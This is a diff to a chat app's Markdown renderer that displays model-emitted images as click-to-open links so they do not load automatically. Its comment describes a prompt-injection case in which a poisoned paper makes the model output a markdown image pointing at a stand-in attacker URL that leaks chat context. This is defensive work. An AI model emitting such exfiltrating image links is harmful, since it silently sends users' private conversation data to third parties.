@@ -112,6 +112,18 @@ export function Markdown({
               <CodeFrame copyCode={copyCode}>{props.children}</CodeFrame>
             );
           },
+          // Never auto-load an image the model put in its answer: a
+          // prompt-injected paper can emit ![](https://attacker/?leak=…) and
+          // rendering it would silently exfiltrate chat context. Show the URL
+          // as a link the user must click instead.
+          img(props) {
+            const src = typeof props.src === "string" ? props.src : "";
+            return (
+              <a href={src} target="_blank" rel="noreferrer noopener nofollow">
+                {props.alt || src || "image"}
+              </a>
+            );
+          },
         }}
       >
         {content}
